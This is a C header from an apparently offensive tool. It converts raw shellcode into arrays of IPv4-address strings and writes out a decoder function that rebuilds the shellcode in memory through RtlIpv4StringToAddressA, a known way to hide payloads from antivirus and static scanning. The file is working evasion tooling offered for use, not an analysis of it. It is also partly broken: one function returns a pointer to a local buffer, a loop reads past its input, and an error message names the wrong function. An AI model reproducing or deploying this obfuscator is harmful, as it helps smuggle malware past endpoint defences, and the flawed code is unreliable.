#pragma once
#include <Windows.h>
#include <stdio.h>


typedef unsigned int uint32_t;


//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------//
// genearte the ipv4 representation of the shellcode[i]
const char* GenerateIpv4(uint32_t ip) {
	unsigned char bytes[4];
	char Output[32];
	bytes[0] = ip & 0xFF;
	bytes[1] = (ip >> 8) & 0xFF;
	bytes[2] = (ip >> 16) & 0xFF;
	bytes[3] = (ip >> 24) & 0xFF;
	//printf("%d.%d.%d.%d\n", bytes[3], bytes[2], bytes[1], bytes[0]);
	sprintf(Output, "%d.%d.%d.%d", bytes[3], bytes[2], bytes[1], bytes[0]);
	return (const char*)Output;

}

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------//
// generate the hex ipv4 representation of the shellcode[i]
uint32_t Generateipv4Hex(int a, int b, int c, int d) {
	uint32_t result = ((uint32_t)a << 24) | ((uint32_t)b << 16) | (c << 8) | d;
	//printf("[i] result: 0x%0-8x \n", result);
	return result;
}


//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------//
// generate the ipv4 output representation of the shellcode
void Generateipv4Output(SIZE_T ShellcodeSize, unsigned char* FinallShell, PBOOL Success) {
	if (!*Success){
		return;
	}
	char WriteHeader[256] = "#include <Windows.h>\n#include <stdio.h>\n#include <Ip2string.h>\n#pragma comment(lib, \"Ntdll.lib\")\n\n#ifndef NT_SUCCESS\n#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)\n#endif\n";
	char WriteConfig[128], CharIP[128];
	char WriteDecoderFunc[1024] = "BOOL DecodeIPv4Fuscation(const char* IPV4[], PVOID LpBaseAddress) {\n\tPCSTR Terminator = NULL;\n\tPVOID LpBaseAddress2 = NULL;\n\tNTSTATUS STATUS;\n\tint i = 0;\n\tfor (int j = 0; j < ElementsNumber; j++) {\n\t\tLpBaseAddress2 = PVOID((ULONG_PTR)LpBaseAddress + i);\n\t\tSTATUS = RtlIpv4StringToAddressA((PCSTR)IPV4[j], FALSE, &Terminator, (in_addr*)LpBaseAddress2);\n\t\tif (!NT_SUCCESS(STATUS)) {\n\t\t\tprintf(\"[!] RtlIpv6StringToAddressA failed for %s result %x\", IPV4[j], STATUS);\n\t\t\treturn FALSE;\n\t\t}\n\t\telse {\n\t\t\ti = i + 4;\n\t\t}\n\t}\n\treturn TRUE;\n}\n";
	WriteFile(PayloadData.hFile, WriteHeader, strlen(WriteHeader), NULL, NULL);
	WriteFile(PayloadData.hFile, "\nconst char * IPv4Shell [] = { \n\t", strlen("\nconst char * IPv4Shell [] = { \n\t"), NULL, NULL);
	int c = 4, C = 0;
	uint32_t HexVal;
	const char* IP = NULL;
	for (int i = 0; i <= ShellcodeSize; i++) {
		if (c == 4) {
			C++;
			HexVal = Generateipv4Hex(FinallShell[i], FinallShell[i + 1], FinallShell[i + 2], FinallShell[i + 3]);
			IP = GenerateIpv4(HexVal);
			if (i == ShellcodeSize - 4) {
				sprintf(CharIP, "\"%s\"", IP);
				WriteFile(PayloadData.hFile, CharIP, strlen(CharIP), NULL, NULL);
				break;
			}
			else {
				sprintf(CharIP, "\"%s\", ", IP);
				WriteFile(PayloadData.hFile, CharIP, strlen(CharIP), NULL, NULL);
			}
			c = 1;
			if (C % 12 == 0) {
				WriteFile(PayloadData.hFile, "\n\t", strlen("\n\t"), NULL, NULL);
			}
		}
		else {
			c++;
		}
	}
	WriteFile(PayloadData.hFile, "\n};\n", strlen("\n};\n"), NULL, NULL);
	sprintf(WriteConfig, "#define ElementsNumber %d\n#define SizeOfShellcode %d\n\n", C, (unsigned int)ShellcodeSize);
	WriteFile(PayloadData.hFile, WriteConfig, strlen(WriteConfig), NULL, NULL);
	WriteFile(PayloadData.hFile, WriteDecoderFunc, strlen(WriteDecoderFunc), NULL, NULL);
	CloseHandle(PayloadData.hFile);
	*Success = TRUE;
}
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------//
// print shellcode to the screen directly 
/*

void Generateipv4Output(SIZE_T ShellcodeSize, unsigned char* FinallShell, PBOOL Success) {
	if (!*Success){
		return;
	}
	printf("\nconst char * IPv4Shell [] = { \n\t");
	int c = 4, C = 0;
	uint32_t HexVal;
	const char* IP = NULL;
	for (int i = 0; i <= ShellcodeSize; i++) {
		if (c == 4) {
			C++;
			HexVal = Generateipv4Hex(FinallShell[i], FinallShell[i + 1], FinallShell[i + 2], FinallShell[i + 3]);
			IP = GenerateIpv4(HexVal);
			if (i == ShellcodeSize - 4) {
				printf("\"%s\"", IP);
				break;
			}
			else {
				printf("\"%s\", ", IP);
			}
			c = 1;
			if (C % 12 == 0) {
				printf("\n\t");
			}
		}
		else {
			c++;
		}
	}

	printf("};\n");
	printf("#define ElementsNumber %d\n", C);
	printf("#define SizeOfShellcode %d\n", (unsigned int)ShellcodeSize);
	*Success = TRUE;
}
*/